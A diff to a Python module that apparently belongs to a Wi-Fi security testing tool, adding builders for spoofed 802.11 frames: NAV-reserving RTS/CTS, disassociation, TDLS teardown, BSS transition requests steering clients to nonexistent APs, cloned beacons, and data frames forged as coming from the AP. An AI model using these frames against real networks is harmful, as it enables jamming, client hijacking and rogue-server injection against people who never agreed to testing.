@@ -44,7 +44,13 @@ __all__ = ["RADIOTAP", "build_radiotap", "EAPOL_LOGOFF", "build_eapol_logoff",
            "build_auth_request", "build_assoc_request", "build_reassoc_request",
            "build_null_data", "build_eapol_start", "build_probe_request",
            "build_csa_beacon", "build_probe_response", "build_arp_request", "build_arp_reply", "build_ssid_confusion_beacon",
-           "spoofed_mac", "DATA_SUBTYPES", "DATA_NAMES"]
+           "spoofed_mac", "DATA_SUBTYPES", "DATA_NAMES",
+           # the third wave: control frames, action frames and injected L3 payloads
+           "ACTION_NAMES", "ACTION_RADIO_MEASUREMENT", "ACTION_SA_QUERY", "ACTION_TDLS",
+           "ACTION_UNPROTECTED_WNM", "CTRL_ACK", "CTRL_CTS", "CTRL_RTS",
+           "build_action", "build_beacon_frame", "build_btm_request", "build_cts",
+           "build_data", "build_disassoc", "build_rm_beacon_request", "build_rts",
+           "build_sa_query", "build_tdls_teardown", "action_name"]
 
 ETHERTYPE_EAPOL = 0x888E
 
@@ -378,6 +384,175 @@ def build_arp_reply(sender_mac: str, sender_ip: str, target_mac: str,
                       _mac_bytes(target_mac), from_client=True)
 
 
+# --------------------------------------------------------------------------- #
+# the third wave: control frames, action frames and L2 payloads
+# --------------------------------------------------------------------------- #
+
+#: control-frame subtypes we build (802.11-2020 table 9-1)
+CTRL_RTS, CTRL_CTS, CTRL_ACK = 11, 12, 13
+
+#: action-frame categories that matter to the attacks here
+ACTION_SPECTRUM_MGMT, ACTION_QOS, ACTION_DLS, ACTION_BLOCK_ACK, ACTION_RADIO_MEASUREMENT = \
+    0, 1, 2, 3, 5
+ACTION_FAST_BSS_TRANSITION, ACTION_SA_QUERY = 6, 8
+ACTION_UNPROTECTED_WNM, ACTION_PROTECTED_WNM, ACTION_TDLS = 9, 10, 12
+
+ACTION_NAMES = {
+    (ACTION_RADIO_MEASUREMENT, 0): "radio measurement request",
+    (ACTION_RADIO_MEASUREMENT, 5): "beacon request",
+    (ACTION_SA_QUERY, 0): "SA Query request",
+    (ACTION_SA_QUERY, 1): "SA Query response",
+    (ACTION_TDLS, 0): "TDLS teardown",
+    (ACTION_UNPROTECTED_WNM, 7): "BSS transition management request",
+    (ACTION_PROTECTED_WNM, 7): "protected BTM request",
+}
+
+
+def build_disassoc(bssid: str, client: str = "ff:ff:ff:ff:ff:ff", reason: int = 8,
+                   station_is_source: bool = False) -> bytes:
+    """A disassociation frame — the sibling of a deauth, and not always filtered."""
+    return build_deauth(bssid, client, reason=reason, disassociate=True,
+                        station_is_source=station_is_source)
+
+
+def build_rts(transmitter: str, receiver: str = "ff:ff:ff:ff:ff:ff",
+              duration: int = 32767) -> bytes:
+    """A request-to-send frame whose duration field reserves the medium (a NAV attack).
+
+    Control frames have no addresses beyond receiver/transmitter and no sequence
+    number: 10 bytes of header and a frame-check sequence.
+    """
+    control, flags = frame_control(1, CTRL_RTS)
+    return (RADIOTAP + struct.pack("<BBH", control, flags, duration & 0x7FFF)
+            + _mac_bytes(receiver) + _mac_bytes(transmitter))
+
+
+def build_cts(receiver: str = "ff:ff:ff:ff:ff:ff", duration: int = 32767) -> bytes:
+    """A CTS-to-self frame with a long duration: the quietest way to hold the medium."""
+    control, flags = frame_control(1, CTRL_CTS)
+    return (RADIOTAP + struct.pack("<BBH", control, flags, duration & 0x7FFF)
+            + _mac_bytes(receiver))
+
+
+def build_action(bssid: str, client: str, category: int, action: int,
+                 payload: bytes = b"", protected: bool = False,
+                 station_is_source: bool = False, token: int = 0) -> bytes:
+    """A management *action* frame: the carrier for SA Query, TDLS, RRM and WNM.
+
+    ``protected`` sets the Protected Frame bit, which is how the SA Query frames of a
+    PMF-capable AP look; the payload is built by the callers below.
+    """
+    transmitter = client if station_is_source else bssid
+    receiver = bssid if station_is_source else client
+    control, flags = frame_control(FC_MGMT, SUBTYPE_ACTION)
+    if protected:
+        flags |= 0x40
+    header = (struct.pack("<BB", control, flags) + b"\x00\x00"
+              + _mac_bytes(receiver) + _mac_bytes(transmitter) + _mac_bytes(bssid)
+              + b"\x00\x00")
+    return RADIOTAP + header + bytes([category, action]) + payload
+
+
+def build_sa_query(bssid: str, client: str, token: int = 0, response: bool = False,
+                   protected: bool = True) -> bytes:
+    """An SA Query action frame: the association-security check 802.11w defines."""
+    return build_action(bssid, client, ACTION_SA_QUERY, 1 if response else 0,
+                        payload=struct.pack("<H", token & 0xFFFF), protected=protected)
+
+
+def build_tdls_teardown(bssid: str, client: str, peer: str = "",
+                        reason: int = 3) -> bytes:
+    """TDLS Teardown: asks a station to drop a direct link (category 12, action 0)."""
+    peer_mac = peer or bssid
+    payload = _mac_bytes(peer_mac) + bytes([reason & 0xFF])
+    return build_action(bssid, client, ACTION_TDLS, 0, payload=payload)
+
+
+def build_rm_beacon_request(bssid: str, client: str, channel: int = 0,
+                            regulatory_class: int = 81, duration: int = 100,
+                            mode: int = 0, measurement_bssid: str = "") -> bytes:
+    """An 802.11k Beacon Request: a station is asked to report beacons for a channel."""
+    payload = (bytes([regulatory_class & 0xFF, channel & 0xFF])
+               + struct.pack("<H", 0)                       # randomisation interval
+               + struct.pack("<H", duration & 0xFFFF)
+               + bytes([mode & 0xFF])
+               + _mac_bytes(measurement_bssid or "ff:ff:ff:ff:ff:ff"))
+    return build_action(bssid, client, ACTION_RADIO_MEASUREMENT, 5, payload=payload)
+
+
+def build_btm_request(bssid: str, client: str, candidates: Sequence[Tuple[str, int, int]] = (),
+                      dialog_token: int = 1, disassociation_timer: int = 0,
+                      validity: int = 60, mode: int = 0) -> bytes:
+    """A BSS Transition Management Request with a neighbour-report element.
+
+    ``candidates`` is ``(bssid, channel, operating_class)``: the APs a client is told
+    to consider.  A station that follows our candidate list to an AP that is not there
+    is the 802.11v twin problem, and that is what the attack measures.
+    """
+    payload = (bytes([dialog_token & 0xFF, mode & 0xFF])
+               + struct.pack("<H", disassociation_timer & 0xFFFF)
+               + bytes([validity & 0xFF]))
+    neighbours = b""
+    for candidate, channel, opclass in candidates:
+        # neighbour report entry: BSSID(6) + BSSID info(4) + opclass(1) + channel(1)
+        # + PHY type(1) = 13 bytes, the stride every parser (ours included) walks
+        neighbours += (_mac_bytes(candidate) + b"\x00\x00\x00\x00"
+                       + bytes([opclass & 0xFF, channel & 0xFF, 0x00]))
+    if neighbours:
+        payload += bytes([52]) + bytes([len(neighbours) + 1]) + bytes([0]) + neighbours
+    return build_action(bssid, client, ACTION_UNPROTECTED_WNM, 7, payload=payload)
+
+
+def build_beacon_frame(bssid: str, ssid: str, channel: int = 6, interval: int = 100,
+                       capability: int = 0x0411, extra_ies: bytes = b"",
+                       rsn: bytes = b"") -> bytes:
+    """A full beacon, with the BSSID given: the clone case is the reason it exists.
+
+    ``build_csa_beacon`` sends a channel switch from a *valid* BSSID; this one can put
+    any BSSID behind any SSID, which is what ``beacon_clone`` measures the reaction to.
+    """
+    body = (b"\x00" * 8 + struct.pack("<H", interval & 0xFFFF)
+            + struct.pack("<H", capability & 0xFFFF))
+    body += _ies([(0, ssid.encode()[:32]), (1, b"\x82\x84\x8b\x96"),
+                  (3, bytes([channel & 0xFF])), (5, b"\x01\x00")])
+    if rsn:
+        body += _ies([(48, rsn)])
+    body += extra_ies
+    return RADIOTAP + _mgmt_header(SUBTYPE_BEACON, "ff:ff:ff:ff:ff:ff", bssid, bssid) + body
+
+
+def build_data(bssid: str, client: str, payload: bytes, ethertype: int = 0x0800,
+               to_ds: bool = False, from_ds: bool = True, qos: bool = False,
+               tid: int = 0, protected: bool = False) -> bytes:
+    """An 802.11 data frame carrying an L3 payload (LLC/SNAP + ethertype + payload).
+
+    With ``from_ds`` the frame looks like it came *from* the AP to the client, which is
+    how a rogue DHCP/DNS/RADIUS server's traffic has to look when it is injected rather
+    than sent by hostapd.
+    """
+    flags = 0
+    if to_ds:
+        flags |= FC_TO_DS
+    if from_ds:
+        flags |= FC_FROM_DS
+    if protected:
+        flags |= 0x40
+    control, _ = frame_control(FC_DATA, 0x08 if qos else 0x00)
+    if to_ds and not from_ds:                     # client -> AP
+        header = (struct.pack("<BBH", control, flags | FC_TO_DS, 0)
+                  + _mac_bytes(bssid) + _mac_bytes(client) + _mac_bytes("ff:ff:ff:ff:ff:ff"))
+    elif from_ds and not to_ds:                   # AP -> client
+        header = (struct.pack("<BBH", control, flags | FC_FROM_DS, 0)
+                  + _mac_bytes(client) + _mac_bytes(bssid) + _mac_bytes(bssid))
+    else:                                         # ad-hoc / DS-to-DS
+        header = (struct.pack("<BBH", control, flags, 0)
+                  + _mac_bytes(client) + _mac_bytes(bssid) + _mac_bytes(bssid))
+    if qos:
+        header += struct.pack("<H", tid & 0x0F)
+    snap = b"\xaa\xaa\x03\x00\x00\x00" + struct.pack(">H", ethertype & 0xFFFF)
+    return RADIOTAP + header + snap + payload
+
+
 def spoofed_mac(seed: int, locally_administered: bool = True) -> str:
     """A deterministic fake station address, for the state-exhaustion attacks.
 
@@ -529,6 +704,11 @@ def header_offset(frame: bytes) -> int:
     return struct.unpack_from("<H", frame, 2)[0]
 
 
+def action_name(category: int, action: int) -> str:
+    """The printed name of an action-frame (category, action) pair."""
+    return ACTION_NAMES.get((category, action), f"action {category}/{action}")
+
+
 def describe(frames: Sequence[bytes]) -> List[Tuple[str, int]]:
     """``(kind, length)`` for a list of built frames — used by the CLI and the UI."""
     out: List[Tuple[str, int]] = []
@@ -540,13 +720,18 @@ def describe(frames: Sequence[bytes]) -> List[Tuple[str, int]]:
         control = frame[offset]
         ftype = (control >> 2) & 0x03
         subtype = (control >> 4) & 0x0F
-        if ftype == 2:
+        if ftype == 1:
+            kind = {CTRL_RTS: "RTS (NAV reservation)", CTRL_CTS: "CTS-to-self (NAV)",
+                    CTRL_ACK: "ACK"}.get(subtype, f"control subtype {subtype}")
+        elif ftype == 2:
             kind = DATA_NAMES.get(subtype, "data")
             base = frame.find(LLC_SNAP_EAPOL, offset)
             if base >= 0:
                 version_at = base + len(LLC_SNAP_EAPOL)
                 packet_type = frame[version_at + 1] if version_at + 1 < len(frame) else -1
                 kind = EAPOL_TYPE_NAMES.get(packet_type, "EAPOL")
+        elif subtype == SUBTYPE_ACTION and offset + 25 < len(frame):
+            kind = action_name(frame[offset + 24], frame[offset + 25])
         else:
             kind = SUBTYPE_NAMES.get(subtype, f"subtype {subtype}")
         out.append((kind, len(frame)))
